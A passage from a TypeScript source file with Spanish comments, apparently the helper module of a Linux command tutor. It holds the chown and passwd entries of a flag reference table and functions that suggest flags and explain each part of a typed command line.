            { flag: '--reference', name: 'Referencia', description: 'Usa propietario/grupo de archivo referencia', requiresValue: true, valueHint: 'archivo_ref' },
            { flag: '-h', name: 'No follow', description: 'Afecta enlaces simbólicos, no el archivo destino' },
        ],
        commonCombinations: ['chown user:group file', 'chown -R www-data:www-data /var/www', 'chown user file']
    },

    passwd: {
        command: 'passwd',
        description: 'Cambiar contraseña de usuario',
        synopsis: 'passwd [OPCIONES] [USUARIO]',
        args: [
            { flag: '-l', name: 'Lock', description: 'Bloquea la cuenta del usuario' },
            { flag: '-u', name: 'Unlock', description: 'Desbloquea la cuenta del usuario' },
            { flag: '-d', name: 'Delete', description: 'Elimina la contraseña (cuenta sin password)' },
            { flag: '-e', name: 'Expire', description: 'Fuerza cambio de contraseña en próximo login' },
            { flag: '-S', name: 'Status', description: 'Muestra estado de la contraseña' },
            { flag: '-n', name: 'Min days', description: 'Días mínimos entre cambios', requiresValue: true, valueHint: '1' },
            { flag: '-x', name: 'Max days', description: 'Días máximos de validez', requiresValue: true, valueHint: '90' },
        ],
        commonCombinations: ['passwd', 'passwd usuario', 'passwd -l usuario']
    },
};

// Función para obtener sugerencias de argumentos basándose en lo que el usuario ha escrito
export function getArgSuggestions(input: string): ArgInfo[] {
    const parts = input.trim().split(/\s+/);
    if (parts.length === 0) return [];

    const command = parts[0].toLowerCase();
    const knowledge = COMMAND_KNOWLEDGE[command];

    if (!knowledge) return [];

    const currentArg = parts[parts.length - 1];
    const usedArgs = new Set(parts.slice(1));

    // Filtrar argumentos ya usados y que coincidan con lo que está escribiendo
    return knowledge.args.filter(arg => {
        if (usedArgs.has(arg.flag)) return false;
        if (currentArg.startsWith('-')) {
            return arg.flag.toLowerCase().startsWith(currentArg.toLowerCase());
        }
        return true;
    });
}

// Función para analizar un comando y explicar cada parte
export interface CommandPart {
    text: string;
    type: 'command' | 'flag' | 'value' | 'path' | 'unknown';
    explanation?: string;
}

export function analyzeCommand(input: string): CommandPart[] {
    const parts: CommandPart[] = [];
    const tokens = input.trim().split(/\s+/);

    if (tokens.length === 0 || !tokens[0]) return parts;

    const command = tokens[0].toLowerCase();
    const knowledge = COMMAND_KNOWLEDGE[command];

    // Primer token es el comando
    parts.push({
        text: tokens[0],
        type: 'command',
        explanation: knowledge?.description || 'Comando no reconocido'
    });

    // Analizar el resto de tokens
    for (let i = 1; i < tokens.length; i++) {
        const token = tokens[i];

        if (token.startsWith('-')) {
            // Es un flag
            const argInfo = knowledge?.args.find(a => a.flag === token || token.startsWith(a.flag));
            parts.push({
                text: token,
                type: 'flag',
                explanation: argInfo?.description || 'Argumento desconocido'
            });

            // Si el argumento requiere valor y hay siguiente token
            if (argInfo?.requiresValue && i + 1 < tokens.length && !tokens[i + 1].startsWith('-')) {
                i++;
                parts.push({
                    text: tokens[i],
                    type: 'value',
                    explanation: `Valor para ${argInfo.name}`
                });
            }
        } else if (token.includes('/') || token.includes('.')) {
            // Parece una ruta o archivo
            parts.push({
                text: token,
                type: 'path',
                explanation: 'Ruta o archivo objetivo'
            });
        } else {
            parts.push({
                text: token,
                type: 'unknown',
                explanation: 'Argumento o valor'
            });
        }
    }

    return parts;
}

// Obtener lista de comandos disponibles
export function getAvailableCommands(): string[] {
    return Object.keys(COMMAND_KNOWLEDGE);
}
